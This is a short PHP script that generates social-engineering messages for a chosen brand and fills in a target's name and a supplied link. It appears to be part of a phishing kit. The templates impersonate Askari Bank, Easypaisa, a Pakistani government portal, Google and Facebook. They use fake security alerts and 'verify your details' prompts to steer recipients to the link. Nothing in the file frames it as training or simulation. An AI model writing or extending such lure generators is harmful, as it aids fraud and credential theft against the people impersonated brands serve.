<?php
session_start();

// Function to generate crafted message for each website
function getCraftedMessage($websiteName, $finalUrl, $userName = '') {
    $messages = [
        "Easypaisa" => "🌟 Exclusive Easypaisa Offer! 🌟\n\nHello {$userName}, access your special Easypaisa promotion here: {$finalUrl}\n\nLimited time offer!",
        "Askari Bank" => "🔐 Important Banking Update!\n\nDear {$userName}, your Askari Bank account requires attention. Please verify your details here: {$finalUrl}\n\nSecure connection guaranteed.",
        "CSD Gov PK" => "📋 Government Notification\n\nDear citizen {$userName}, important update from CSD Government PK. Access your portal here: {$finalUrl}\n\nOfficial government communication.",
        "Google" => "📧 Google Security Alert\n\nHello {$userName}, we've detected unusual activity on your Google account. Please secure your account here: {$finalUrl}\n\nGoogle Security Team",
        "Real Estate" => "🏡 Exclusive Property Opportunity!\n\nHello {$userName}, we found the perfect property match for you! View details here: {$finalUrl}\n\nLimited availability!",
        "Facebook" => "⚠️ Facebook Security Notice\n\nHi {$userName}, your Facebook account needs immediate verification. Please secure it here: {$finalUrl}\n\nFacebook Security Team",
        "War Zone" => "🎮 Special Gaming Offer!\n\nHey {$userName}, you've been selected for exclusive War Zone content! Access it here: {$finalUrl}\n\nLimited time access!",
        "Hackathon" => "💻 Hackathon Invitation\n\nHello {$userName}, you're invited to join our exclusive hackathon event! Register here: {$finalUrl}\n\nPrizes await!",
        "Eshop2" => "🛍️ Flash Sale Alert!\n\nHi {$userName}, exclusive discounts waiting for you at our Eshop! Shop now: {$finalUrl}\n\nLimited stock available!",
        "Stylo Website" => "💄 Beauty & Style Exclusive\n\nHello {$userName}, discover your personalized beauty recommendations at Stylo: {$finalUrl}\n\nSpecial offer inside!"
    ];
    
    return $messages[$websiteName] ?? "Hello {$userName}, here is your link: {$finalUrl}";
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $websiteName = $_POST['websiteName'] ?? '';
    $finalUrl = $_POST['finalUrl'] ?? '';
    $userName = $_POST['userName'] ?? '';
    
    echo getCraftedMessage($websiteName, $finalUrl, $userName);
    exit();
}
?>